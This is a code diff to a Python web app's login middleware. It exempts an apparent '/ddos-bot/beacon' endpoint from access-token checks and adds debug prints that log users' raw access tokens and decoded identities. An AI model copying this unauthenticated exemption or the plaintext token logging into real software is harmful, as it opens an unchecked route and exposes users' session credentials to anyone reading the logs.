@@ -5,13 +5,18 @@ from database.auth import verify_access_token, get_current_user
 # middleware: check access_token before run into api
 async def check_access_token(request: Request, call_next):
     # ignore /login and /static, ...
-    if request.url.path in ["/login", "/", "/favicon.ico", "/register"] or request.url.path.startswith("/static") or request.url.path.startswith("/api/v1"):
+    if request.url.path in ["/login", "/", "/favicon.ico", "/register"] or request.url.path.startswith("/static") or request.url.path.startswith("/api/v1") or request.url.path.startswith("/ddos-bot/beacon"):
         return await call_next(request)
     try:
         token = request.cookies.get("access_token")
-
-        user = verify_access_token(token)
+        print("token: ", token)
+        user = None
+        if token:
+            user = verify_access_token(token)
+            print("user: ", user)
         if not token or not user:
+            reason = "No token" if not token else "Invalid or expired token"
+            print("Redirecting to login, reason: ", reason)
             response = RedirectResponse(url="/login", status_code=status.HTTP_302_FOUND)
             response.set_cookie(
                 key="access_token",
@@ -27,7 +32,8 @@ async def check_access_token(request: Request, call_next):
         # after all check, run into api
         response: Response =  await call_next(request)
         return response
-    except Exception:
+    except Exception as e:
+        print("middleware: ", e)
         # delete cookie if verify is error
         response = RedirectResponse(url="/login", status_code=status.HTTP_302_FOUND)
         response.set_cookie(
